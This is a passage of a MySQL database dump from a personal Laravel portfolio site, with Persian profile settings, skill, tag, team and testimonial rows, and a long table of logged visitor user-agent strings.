07:14:27'),(17,'text_education','تحصیلاتم رو در دبیرستانی در کرج به پایان رسوندم و بلافاصله وارد دانشگاه خوارزمی در رشته علوم کامپیوتر شدم و تقریبا از سال دوم دانشگاه، در کنار تحصیل، وارد بازار کار نیز شدم و به صورت پاره وقت مشغول کار در زمینه طراحی و توسعه وب شدم.','textarea','2017-04-17 13:48:51','2017-10-18 07:19:35'),(18,'text_team','','textarea','2017-04-17 13:48:51','2017-04-17 13:48:51'),(19,'text_testimonial','','textarea','2017-04-17 13:48:51','2017-04-17 13:48:51'),(20,'text_blog','','textarea','2017-04-17 13:48:51','2017-04-17 13:48:51'),(21,'contact_email','me@saeednasiri.com','text','2017-04-17 13:48:51','2017-04-17 13:48:51'),(22,'resume_file','','file','2017-04-17 13:48:51','2017-04-17 13:48:51'),(23,'avatar_file','IMG_20170121_102606.jpg','image','2017-04-17 13:48:51','2017-07-18 05:04:16');
/*!40000 ALTER TABLE `settings` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `skills`
--

DROP TABLE IF EXISTS `skills`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `skills` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `percentage` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `state` tinyint(4) NOT NULL DEFAULT '0',
  `created_by` int(10) unsigned NOT NULL,
  `updated_by` int(10) unsigned NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `deleted_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `skills_created_by_foreign` (`created_by`),
  KEY `skills_updated_by_foreign` (`updated_by`),
  CONSTRAINT `skills_created_by_foreign` FOREIGN KEY (`created_by`) REFERENCES `users` (`id`),
  CONSTRAINT `skills_updated_by_foreign` FOREIGN KEY (`updated_by`) REFERENCES `users` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=8 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `skills`
--

LOCK TABLES `skills` WRITE;
/*!40000 ALTER TABLE `skills` DISABLE KEYS */;
INSERT INTO `skills` VALUES (1,'PHP','90',1,1,1,'2017-04-20 14:48:40','2017-04-20 14:49:51',NULL),(2,'Vue.js','60',1,1,1,'2017-08-29 07:15:41','2017-08-29 07:15:53',NULL),(3,'Laravel','80',1,1,1,'2017-08-29 07:16:21','2017-08-29 07:16:21',NULL),(4,'jQuery','60',1,1,1,'2017-08-29 07:17:17','2017-08-29 07:17:17',NULL),(5,'Bootstrap','60',1,1,1,'2017-08-29 07:17:31','2017-08-29 07:17:31',NULL),(6,'MySQL','80',1,1,1,'2017-08-29 07:17:48','2017-08-29 07:17:48',NULL),(7,'CSS','40',1,1,1,'2017-08-29 07:18:00','2017-08-29 07:18:00',NULL);
/*!40000 ALTER TABLE `skills` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `tags`
--

DROP TABLE IF EXISTS `tags`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `tags` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `slug` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `deleted_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=12 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `tags`
--

LOCK TABLES `tags` WRITE;
/*!40000 ALTER TABLE `tags` DISABLE KEYS */;
INSERT INTO `tags` VALUES (1,'php','php','2017-07-18 07:11:16','2017-07-18 07:11:16',NULL),(2,'laravel','laravel','2017-10-23 09:06:55','2017-10-23 09:06:55',NULL),(3,'blade','blade','2017-10-24 09:35:01','2017-10-24 09:35:01',NULL),(4,'seed','seed','2017-10-24 15:53:21','2017-10-24 15:53:21',NULL),(5,'eloquent','eloquent','2017-10-28 06:56:58','2017-10-28 06:56:58',NULL),(6,'models','models','2017-11-04 07:11:59','2017-11-04 07:11:59',NULL),(7,'hasMany','hasmany','2017-11-04 07:11:59','2017-11-04 07:11:59',NULL),(8,'belongsTo','belongsto','2017-11-04 07:11:59','2017-11-04 07:11:59',NULL),(9,'mutator','mutator','2017-11-28 07:30:00','2017-11-28 07:30:00',NULL),(10,'migration','migration','2017-12-25 08:49:49','2017-12-25 08:49:49',NULL),(11,'foreign_key','foreign-key','2017-12-25 08:49:49','2017-12-25 08:49:49',NULL);
/*!40000 ALTER TABLE `tags` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `teams`
--

DROP TABLE IF EXISTS `teams`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `teams` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `title` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `image` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `content` text COLLATE utf8_unicode_ci NOT NULL,
  `state` tinyint(4) NOT NULL DEFAULT '0',
  `created_by` int(10) unsigned NOT NULL,
  `updated_by` int(10) unsigned NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `deleted_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `teams_created_by_foreign` (`created_by`),
  KEY `teams_updated_by_foreign` (`updated_by`),
  CONSTRAINT `teams_created_by_foreign` FOREIGN KEY (`created_by`) REFERENCES `users` (`id`),
  CONSTRAINT `teams_updated_by_foreign` FOREIGN KEY (`updated_by`) REFERENCES `users` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `teams`
--

LOCK TABLES `teams` WRITE;
/*!40000 ALTER TABLE `teams` DISABLE KEYS */;
INSERT INTO `teams` VALUES (1,'سعید نصیری','برنامه‌نویس','14924536151490689599user.jpg','برنامه نویس سایت و سیستم‌های سرویس دهنده<br><p><br></p>',1,1,1,'2017-04-17 13:56:55','2017-04-17 13:57:02',NULL);
/*!40000 ALTER TABLE `teams` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `testimonials`
--

DROP TABLE IF EXISTS `testimonials`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `testimonials` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `subtitle` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `image` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `content` text COLLATE utf8_unicode_ci NOT NULL,
  `state` tinyint(4) NOT NULL DEFAULT '0',
  `created_by` int(10) unsigned NOT NULL,
  `updated_by` int(10) unsigned NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `deleted_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `testimonials_created_by_foreign` (`created_by`),
  KEY `testimonials_updated_by_foreign` (`updated_by`),
  CONSTRAINT `testimonials_created_by_foreign` FOREIGN KEY (`created_by`) REFERENCES `users` (`id`),
  CONSTRAINT `testimonials_updated_by_foreign` FOREIGN KEY (`updated_by`) REFERENCES `users` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `testimonials`
--

LOCK TABLES `testimonials` WRITE;
/*!40000 ALTER TABLE `testimonials` DISABLE KEYS */;
INSERT INTO `testimonials` VALUES (1,'علیرضا قربانی','خواننده سنتی ایران','14927057621492401317images.jpg','خیلی کارش خوبه<br><p><br></p>',0,1,1,'2017-04-20 11:57:15','2017-04-20 11:59:22',NULL);
/*!40000 ALTER TABLE `testimonials` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `tracker_agents`
--

DROP TABLE IF EXISTS `tracker_agents`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `tracker_agents` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `name` mediumtext COLLATE utf8_unicode_ci NOT NULL,
  `browser` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `browser_version` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `name_hash` varchar(65) COLLATE utf8_unicode_ci DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `tracker_agents_name_hash_unique` (`name_hash`),
  KEY `tracker_agents_browser_index` (`browser`),
  KEY `tracker_agents_created_at_index` (`created_at`),
  KEY `tracker_agents_updated_at_index` (`updated_at`)
) ENGINE=InnoDB AUTO_INCREMENT=110 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `tracker_agents`
--

LOCK TABLES `tracker_agents` WRITE;
/*!40000 ALTER TABLE `tracker_agents` DISABLE KEYS */;
INSERT INTO `tracker_agents` VALUES (1,'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0','Firefox','57.0','2017-12-26 10:50:42','2017-12-26 10:50:42','5163833aa91b2a74997a09f1c24a4ad7e1553648eb5d5e7d2d6b7d5e76d79886'),(2,'Mozilla/5.0 (compatible; MJ12bot/v1.4.7; http://mj12bot.com/)','MJ12bot','1.4.7','2017-12-26 10:28:07','2017-12-26 10:28:07','c37fd8c84b57fdfbbdf30c8cb4cd049f5364c2b65f8f6c406f18d61fe2d988e6'),(3,'Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)','MJ12bot','1.4.8','2017-12-26 13:46:29','2017-12-26 13:46:29','028fc451e7954d31854e3ed9bd613c3d64a3dca6ac70e2f24689c771b48a295a'),(4,'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)','Googlebot','2.1','2017-12-26 14:24:03','2017-12-26 14:24:03','043937ea8abaea325dbde1020b1bdd9f921dcbae7450dc9141c47a7d3473c917'),(5,'Testbot/Testbot-0.1 (http://www.example.com/)','Testbot','0.1','2017-12-26 15:00:11','2017-12-26 15:00:11','b1ebccb9293aa45a8ce3f5a3a4114c832460846ccced6fe0d200723a7fc1c09f'),(6,'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0','Firefox','33.0','2017-12-26 15:00:11','2017-12-26 15:00:11','b0202e68d2df0f9de07f5cc2fbc08b2e718af1fcb7a3c6a7ef2182afea9fd026'),(7,'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0','Firefox','45.0','2017-12-26 19:03:09','2017-12-26 19:03:09','ae88d84656640419dcfbbb9b5c6b549c6cf556f9662a867d42ab6091f8587017'),(8,'LightspeedSystemsCrawler Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US','LightspeedSystemsCrawler','','2017-12-26 20:05:43','2017-12-26 20:05:43','91e3380abf6c0d5331fe3b2cd76c7ea1fe08d06bfed1fd26e5b46ac67ad8ef1b'),(9,'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1','Firefox','40.1','2017-12-26 21:53:42','2017-12-26 21:53:42','be33efd277066a33ddc82f77d3cd7f9639531bdd21d1c72230864a5d5a66132b'),(10,'Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Firefox','45.0','2017-12-27 01:11:32','2017-12-27 01:11:32','b8f079b3d81a3a1f6ff1d6ff88573fd95ae5848445221d8ede685505992e73f5'),(11,'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36; 360Spider','360Spider','','2017-12-27 02:03:25','2017-12-27 02:03:25','99a669e08ca8ccfeef3ab51abad702046349fd65c0ac3bd0118777264a50e307'),(12,'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.4.2661.102 Safari/537.36; 360Spider','360Spider','','2017-12-27 02:03:31','2017-12-27 02:03:31','2b8add5c4d9d1ee409734ec21c9ae24af6dc325a90177c076fb83d42b72687c6'),(13,'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)','Yahoo! Slurp','','2017-12-27 02:51:14','2017-12-27 02:51:14','aec21f12a6b57428a818325ca873249fc3553df90b228b997743cd51475f4fee'),(14,'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.8) Gecko/20100721 Firefox/3.6.8','Firefox','3.6.8','2017-12-27 03:06:46','2017-12-27 03:06:46','4babedceba973d66677df7da9532da031aa3e9c09b7dd36b8dc85bd670a27c02'),(15,'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36','Chrome','63.0.3239','2017-12-27 03:45:16','2017-12-27 03:45:16','5672f15dc2c3dbf30b2bc155b46acdb37a7adaac1f21b705c18c6cd26447af05'),(16,'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)','Baiduspider','2.0','2017-12-27 04:25:03','2017-12-27 04:25:03','a04d2890e0c14dc29a3a584e4b1f1a530a003f8328d38df49e1b6d408529d2bd'),(17,'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)','YandexBot','3.0','2017-12-27 04:48:30','2017-12-27 04:48:30','e4b041114023353df050002a76991832cae63d0d0154b0745d6ed42b1d97a918'),(18,'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)','bingbot','2.0','2017-12-27 06:49:39','2017-12-27 06:49:39','6a88e860a06fb7162c385a215d8c7bec6ab6bd51d18a4d0ef5b3997509a7e1cf'),(19,'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon','Chrome','49.0.2623','2017-12-27 07:37:52','2017-12-27 07:37:52','3e1e2224d1481b9ee6b3927970fd4406ad6d5ea029356f093a98c31e3f532795'),(20,'Other','Other','','2017-12-27 07:52:35','2017-12-27 07:52:35','f97e9da0e3b879f0a9df979ae260a5f7e1371edb127c1862d4f861981166cdc1'),(21,'Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)','Sogou web spider','4.0','2017-12-27 08:28:22','2017-12-27 08:28:22','09810ee8c5e2a0b40a45d7b2c0f07ac7d9cfa24a289be757192bfa6fd259a882'),(22,'Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w','Qwantify','2.4','2017-12-27 08:46:08','2017-12-27 08:46:08','ac35e0296769f92618e8baf55b7fa5c47d94fb0327e069191793bd473477667c'),(23,'ia_archiver','ia_archiver','','2017-12-27 21:28:45','2017-12-27 21:28:45','013564dbc5c84aab133e18a84fe6e864fcaf3667922de5d79235e427bc2f3dc9'),(24,'Mozilla/5.0 (compatible; parsijoo-batch-crawler; +http://www.parsijoo.ir/; crawler@parsijoo.ir)','parsijoo-batch-crawler','','2017-12-28 03:49:46','2017-12-28 03:49:46','b7273aedf47e0d9e8aee472563036f0e248368027fa380579b8856f13fd990db'),(25,'Mozilla/5.0 (compatible; AlphaBot/3.2; +http://alphaseobot.com/bot.html)','AlphaBot','3.2','2017-12-28 04:32:20','2017-12-28 04:32:20','c1686ec3b0c90e896de2aa7e6bafd50578f3521cf4f5759edb4c054faf38a214'),(26,'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.2.2661.102 Safari/537.36; 360Spider','360Spider','','2017-12-28 07:45:49','2017-12-28 07:45:49','0023b7aecba1d84106d13922237811c7918e9b7fee24bb46322a6cf32fdef9e8'),(28,'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299','Edge','16.16299','2017-12-28 10:30:53','2017-12-28 10:30:53','fa6e7d7bc4c6e757170f47a5b29c799f26e5861050c82aa0a8315877e3ed55b3'),(29,'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36','Chrome','61.0.3163','2017-12-28 13:03:57','2017-12-28 13:03:57','c8c94411a3eb8551ec03c231f8563fa783c67dacd32612502261a2d1eb2db07e'),(30,'curl/7.54.0','curl','7.54.0','2017-12-28 17:35:18','2017-12-28 17:35:18','8291dcab9f9e73e36b70cb12caa53e63b4d7d3fe9d75223dd492d8657757715a'),(31,'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0','Firefox','50.0','2017-12-28 18:35:19','2017-12-28 18:35:19','deed9c40da410fc319adca3b65502ef91be4e1ecb5e422eb576c04d0603f4fb4'),(32,'Mozilla/5.0 (Windows NT 6.2; WOW64)','Other','','2017-12-28 19:18:58','2017-12-28 19:18:58','eb34b299ac6efb4818cd039a18310686d11ba415f3ef5db5af0c2837759491d5'),(33,'Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)','bingbot','2.0','2017-12-28 19:51:46','2017-12-28 19:51:46','e39fc85efec73c83e1f8d181982901d7476f50c5b4cdd3054dc9f8e2c90a7c1d'),(34,'Flock/2.0 (Windows NT 6.0; ar_SD;)','Flock','2.0','2017-12-29 00:12:49','2017-12-29 00:12:49','f4a8d46ba9c1aef4f4c60f27a85f6f5302cba6d972aedef2e604b1b9b52464ff'),(35,'Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 BingPreview/1.0b','BingPreview','1.0','2017-12-29 02:12:06','2017-12-29 02:12:06','c0d146e2fa4a4c64ab46adc35c80992de103ba81a3530c0bbd786bf51b52944e'),(36,'Mozilla/5.0(compatible;MSIE9.0;WindowsNT6.1;Trident/5.0)','IE','9.0','2017-12-29 04:31:41','2017-12-29 04:31:41','60e0b3f20eb0786ae158d04d3a022d40d559d4238686645d9dc072e60478d190'),(37,'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)','Googlebot','2.1','2017-12-29 05:45:01','2017-12-29 05:45:01','622963d1399060fa6a5994a5147b58746dd06c4611ca6d6c781a61307c547ffc'),(38,'Mozilla/5.0 (compatible; Wappalyzer; https://www.wappalyzer.com)','Other','','2017-12-29 10:55:38','2017-12-29 10:55:38','6225abbca4e96b7badf6f04830842ac40502373aec0bb36e5ab8d4b3f6cfc0de'),(39,'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36','Chrome','57.0.2987','2017-12-29 12:08:47','2017-12-29 12:08:47','7404fb886508b034711a59e06ba27417e9b7b0378bea676ee553d0ddf42f960c'),(40,'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36','Chrome','63.0.3239','2017-12-29 12:25:28','2017-12-29 12:25:28','7820d60c701c88b50706db87ebec203b769cf158bbc72f51fe3f11873f117dad'),(41,'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36','Chrome','62.0.3202','2017-12-29 13:09:43','2017-12-29 13:09:43','a42462ea7fba69f7318b389ced94c714cae8a005a6dba240b38170c5d2e287f0'),(42,'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36','Chrome','56.0.2924','2017-12-29 13:26:51','2017-12-29 13:26:51','32e7c1cd122323052b83d96e75fef55bae95653db72e0b07df626ccdc888e692'),(43,'Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0','Firefox','57.0','2017-12-29 13:50:00','2017-12-29 13:50:00','05ae9848243afac69e599d5101022fa45a07e599f4619bc64ba044bd44199083'),(44,'Mozilla/5.0 (compatible; Uptimebot/1.0; +http://www.uptime.com/uptimebot)','Uptimebot','1.0','2017-12-29 17:25:07','2017-12-29 17:25:07','3d8b22566852ac85d457d6997d7f2f8187555c2a45e944ee1378ccc8c2e72598'),(45,'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0','Firefox','57.0','2017-12-29 18:05:32','2017-12-29 18:05:32','2f8861d9a3f2b4922c2a23e25b8df47f0285603421922ee68ce574dd501b9014'),(46,'Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)','DotBot','1.1','2017-12-29 18:41:52','2017-12-29 18:41:52','2e51d1f92ead4e6eaa1a328dbc28b9c083d658d259871d571e6d24af2ce4d8e7'),(47,'Mozilla/5.0 (compatible; yoozBot-2.2; http://yooz.ir; info@yooz.ir)','yoozBot','','2017-12-29 20:30:33','2017-12-29 20:30:33','f816344c3c411ceb06e1b56fd4e4f60c311dbc38911b26fad58b1edf9abdf449'),(48,'Dragon/7.9 (Windows 2000 4.5; en_CA;)','Dragon','7.9','2017-12-30 04:26:19','2017-12-30 04:26:19','985b2365f33cfcc98cb165606e2fdd5e0aee01530759aabed606fa6182694594'),(49,'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview Analytics) Chrome/41.0.2272.118 Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)','Googlebot','2.1','2017-12-30 07:00:04','2017-12-30 07:00:04','fd486dc5ee5b45a867661a8e28cf26b2448293beae82f9498dd42f0089ca95ef'),(50,'Mozilla/5.0 (Linux; Android 6.0.1; HUAWEI RIO-L01 Build/HuaweiRIO-L01) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36','Chrome Mobile','58.0.3029','2017-12-30 15:45:40','2017-12-30 15:45:40','215217723163b3d61f11a4814d1375ec75081c460c739d6a6bafc3fbf01b6278'),(51,'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36','Chrome','58.0.3029','2017-12-30 20:54:56','2017-12-30 20:54:56','85c7670cd104b6267736d64f2018a0dc4a4ee75e670f3562ddb2404c001f3173'),(52,'Seamonkey/20.15 (CentOS Linux 5.7; ar_OM;)','Other','','2017-12-31 00:51:21','2017-12-31 00:51:21','692c0dfbffe1000b5775bce97f50ebd0da39669c570bc496e0ee9d146bd362fc'),(53,'IDG/IT (http://spaziodati.eu/)','Other','','2017-12-31 02:45:03','2017-12-31 02:45:03','b211094572b4854ca12e79a9587cc8faa1e27fd688c5e80dee037a78e3193567'),(54,'TelegramBot (like TwitterBot)','TwitterBot','','2017-12-31 06:09:32','2017-12-31 06:09:32','dbfd68a4ed00a834225d806dcef4d771f36069bc30708843b83d9dfbef6a02d2'),(55,'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36','Chrome','52.0.2743','2017-12-31 08:21:39','2017-12-31 08:21:39','702dd86b36709cafe2b18172a7fb3e2198d2c295b715f86f44473cd7f608d6eb'),(56,'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 YaBrowser/17.3.0.1785 Yowser/2.5 Safari/537.36','Yandex Browser','17.3.0','2017-12-31 09:43:39','2017-12-31 09:43:39','5df81b5f983af6e14df6d7ffadcccd84cd63673f8f53e8d2cb194de38e47e29c'),(57,'Safari/15.6 (Unix 6.1; ar_TN;)','Safari','','2017-12-31 19:12:25','2017-12-31 19:12:25','5c18c4fd8fe0376fe4f0852d5836ef3850ecbec5e2c45d0987ef2e02443dc923'),(58,'Mozilla/5.0 (compatible; Parsijoobot; +http://www.parsijoo.ir/bot.html; crawler@parsijoo.ir)','Parsijoobot','','2017-12-31 22:28:09','2017-12-31 22:28:09','30d93c2c0cda25e1d014290c8f6385e3f3a3e17b078d7172e1415e81245d77e7'),(59,'python-requests/2.18.4','Python Requests','2.18','2018-01-01 02:01:21','2018-01-01 02:01:21','eaf4016212dc8925f51c181daf21fd9319cdc298ea49a8571c0bd198f8fe2d80'),(60,'G-i-g-a-b-o-t','Other','','2018-01-01 02:04:39','2018-01-01 02:04:39','832f6b45c4f78edb162fdc1b21ef74b67b739b82d2f71afc92ed4aabc51ae8a3'),(61,'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0;  Trident/5.0)','IE','9.0','2018-01-01 04:37:21','2018-01-01 04:37:21','a40de42724f73d8e272df395e2d48173c9d7b2fa962e3edbfb2bf0d08da5fd15'),(62,'redback/v0-570-g26f8c96','Other','','2018-01-01 09:38:41','2018-01-01 09:38:41','46ab966210aeebf9d21c80170468e30c75ccd5635b8bc10a2be8403751ae3545'),(63,'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0','Firefox','48.0','2018-01-01 11:07:29','2018-01-01 11:07:29','ee70954d95138b55f83f145f3ee17a1ab627ef6867ecfbbbe668b4097ede7a8c'),(64,'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36','Chrome','63.0.3239','2018-01-01 15:29:33','2018-01-01 15:29:33','0f78a72bbdd73ab7233bbb22fd65089d2342bf9eb35bc3c99277b0488fbc61f8'),(65,'IBrowse/5.11 (Windows 2000 6.0; sq;)','IBrowse','5.11','2018-01-01 16:55:30','2018-01-01 16:55:30','4913043248c18b920bbff82b71466c16bc9e41059b3e57cb9b8ce3d1c5b7ff61'),(66,'SeaMonkey/12.6 (Unix 7.6; ar_KW;)','SeaMonkey','12.6','2018-01-01 18:41:20','2018-01-01 18:41:20','2463f8484703dc554fad5f5fd2e437fb32affef2b33cc28ebe6272771ab10c56'),(67,'Wotbox/2.01 (+http://www.wotbox.com/bot/)','Wotbox','2.01','2018-01-01 18:57:29','2018-01-01 18:57:29','d7494bb5fc395b76a9c3941414fae93db1ad8e76f1a80b508c893cca2d0dca74'),(68,'Mozilla/5.0 (compatible; Linux x86_64; Mail.RU_Bot/Robots/2.0; +http://go.mail.ru/help/robots)','Mail.RU_Bot','','2018-01-02 01:01:07','2018-01-02 01:01:07','f2efaf85c35538a7c19b5adbae91d463d2eacdecf1f7f42f09545927275de780'),(69,'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36','Chrome','63.0.3239','2018-01-02 05:35:08','2018-01-02 05:35:08','4bd48765dc9be2a41fc88c264fb9cf6869ece0b573ef9f0205fb356ee6f018fb'),(70,'Mozilla/5.0 (X11; Linux x86_64; rv:55.0) Gecko/20100101 Firefox/55.0','Firefox','55.0','2018-01-02 18:17:06','2018-01-02 18:17:06','dec4fdf6408be2ff275246ae930c1855f5026de1deb6914c6aaacb6a8d5c8b2b'),(71,'Virusdie crawler/3.0','Virusdie crawler','3.0','2018-01-02 23:05:29','2018-01-02 23:05:29','14b05f66c29c13be19fefe16d63b687e7c38763a9de8d8067f64c392443cb8b0'),(72,'Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36','Chrome','32.0.1667','2018-01-03 00:28:23','2018-01-03 00:28:23','f15bfddf1358638c7d3326272c4ad19cca07dc54b1c06b246349cf65e24e7d04'),(73,'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)','IE','6.0','2018-01-03 03:15:11','2018-01-03 03:15:11','5484bae7e199b948f7d7dca3ea362c99b76d27b31e5f8255ecc54f4fc64d629b'),(74,'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36','Chrome','58.0.3029','2018-01-04 05:15:05','2018-01-04 05:15:05','db6617bdf261170ef02f3b218bee14e7d6c0dfa06a5bebb6dbe575a4811e8c1f'),(75,'Mozilla/5.0 (Windows NT 5.1; WOW64; x64) AppleWebKit/531.82.35 (KHTML, like Gecko) 